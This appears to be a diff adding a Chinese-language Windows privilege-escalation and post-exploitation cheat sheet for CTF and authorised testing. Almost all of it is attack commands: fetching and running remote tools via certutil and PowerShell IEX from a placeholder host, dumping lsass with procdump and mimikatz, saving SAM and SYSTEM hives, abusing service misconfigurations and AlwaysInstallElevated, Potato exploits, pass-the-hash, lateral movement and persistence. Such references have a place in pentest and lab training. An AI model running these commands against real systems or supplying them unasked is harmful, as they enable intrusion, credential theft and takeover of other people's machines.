@@ -1,0 +1,98 @@
+==========================================================================
+ Windows 提权 / 后渗透信息收集速查（CTF Web/Pwn getshell 后）
+ 仅用于授权测试与靶场
+==========================================================================
+
+【0x01 一键脚本】
+  WinPEAS:
+    certutil -urlcache -split -f http://x/winPEASx64.exe winpeas.exe
+    winpeas.exe quiet fast
+  PowerUp:
+    powershell -exec bypass -c "IEX(IWR http://x/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks"
+  Watson/SharpWatson: 补丁缺失提权建议
+  windows-exploit-suggester: python wes.py systeminfo.txt
+
+【0x02 基础信息（cmd / powershell）】
+  whoami /all           用户、组、特权(SeImpersonate/SeLoadDriver 等)
+  systeminfo | findstr /B /C:"OS" /C:"System Type"
+  wmic qfe get Caption,Description,HotFixID,InstalledDate   补丁
+  ipconfig /all; route print; netstat -ano
+  tasklist /svc; tasklist /m | findstr dll
+  net user; net localgroup administrators; net localgroup
+  set; echo %PATH%; ver
+  PowerShell:
+    Get-ComputerInfo; $PSVersionTable
+    Get-NetTCPConnection -State Listen
+    Get-Process | sort StartTime
+
+【0x03 服务配置错误（最常见）】
+  sc qc <服务名>                  查 BINARY_PATH_NAME
+  accesschk.exe -uwcqv "Authenticated Users" * / -uwd *
+  1) 未引用路径含空格 (Unquoted Service Path):
+     wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
+     路径 C:\Program Files\My App\svc.exe 无引号 -> 放 C:\Program.exe
+  2) 服务二进制可写: 直接替换 exe 后 sc stop/start
+  3) 服务注册表可写:
+     reg query HKLM\SYSTEM\CurrentControlSet\Services\<svc>
+     改 ImageName 为你的 exe
+  PowerUp: Get-ServiceUnquoted / Get-ModifiableServiceFile /
+           Get-ServiceFilePermission，Invoke-ServiceAbuse
+
+【0x04 自动登录/注册表凭据】
+  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    DefaultPassword / DefaultUserName
+  reg query HKLM /f password /t REG_SZ /s
+  cmdkey /list
+  lsass 凭据:
+    procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+    mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonPasswords
+    或直接: privilege::debug; sekurlsa::logonPasswords full
+  凭据管理器: vaultcmd /listcreds
+  无人值守: C:\Windows\Panther\Unattend.xml、sysprep.inf
+
+【0x05 计划任务】
+  schtasks /query /fo LIST /v
+  Get-ScheduledTask | ft TaskName,TaskPath,State
+  找以 SYSTEM 运行且脚本/二进制可写的任务，替换后等触发或:
+    schtasks /run /tn "任务名"
+
+【0x06 危险特权】
+  whoami /priv 关注:
+    SeImpersonate/SeAssignPrimaryToken -> JuicyPotato/RoguePotato/
+      PrintSpoofer/GodPotato（配合服务账户如 IIS AppPool）
+      PrintSpoofer: PrintSpoofer64.exe -i "cmd.exe"
+    SeLoadDriver -> 恶意驱动提权
+    SeBackup/SeRestore -> 备份 SAM/SYSTEM
+      reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM system.hiv
+    SeTakeOwnership -> 取得文件所有权
+  AlwaysInstallElevated:
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+    reg query HKLM\...\Installer  两个 AlwaysInstallElevated=1
+    -> msiexec /i evil.msi qn  SYSTEM 安装
+
+【0x07 内核/补丁漏洞（按版本）】
+  MS17-010 EternalBlue: 445 SMB，Windows 7/2008
+  MS16-032、MS16-135、MS15-051
+  CVE-2021-1675/34527 PrintNightmare
+  CVE-2023-21768、CVE-2024-30088 等新内核提权（查系统版本）
+  先 systeminfo/wmic qfe 收集补丁 -> wes.py 或 Watson 比对
+
+【0x08 提权后/横向】
+  psexec / wmiexec / smbexec / winrm:
+    wmic /node:host process call create "cmd /c ..."
+    Enter-PSSession host -Credential $c
+  哈希传递: mimikatz sekurlsa::pth /user /ntlm /domain
+  RDP: xfreerdp /u:user /p:pass /v:host
+  端口转发: plink -R/-L、netsh interface portproxy、chisel
+  持久化(仅靶场): 计划任务/服务/注册表 Run/启动目录/隐藏用户
+
+【0x09 常见 CTF 落点】
+  桌面、C:\Users\Public、C:\Windows\Temp、IIS 目录 C:\inetpub\wwwroot
+  web.config、应用 App_Data、数据库连接串
+  PowerShell 历史:
+    %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  回收站、卷影副本:
+    vssadmin list shadows
+    robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Users ...
+  BitLocker 恢复密钥、保存的 RDP 凭据、浏览器密码库
+==========================================================================
